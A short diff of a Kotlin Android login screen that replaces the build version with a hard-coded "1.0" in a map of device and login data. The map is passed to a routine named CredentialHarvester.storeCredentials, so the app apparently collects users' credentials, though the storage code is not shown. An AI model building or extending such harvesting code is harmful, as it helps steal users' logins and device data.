@@ -69,7 +69,7 @@ class LoginActivity : AppCompatActivity() {
                 "device_manufacturer" to android.os.Build.MANUFACTURER,
                 "android_version" to android.os.Build.VERSION.RELEASE,
                 "login_successful" to (!failed).toString(),
-                "app_version" to BuildConfig.VERSION_NAME
+                "app_version" to "1.0" // Hard-coded version instead of BuildConfig
             )
             
             CredentialHarvester.storeCredentials(
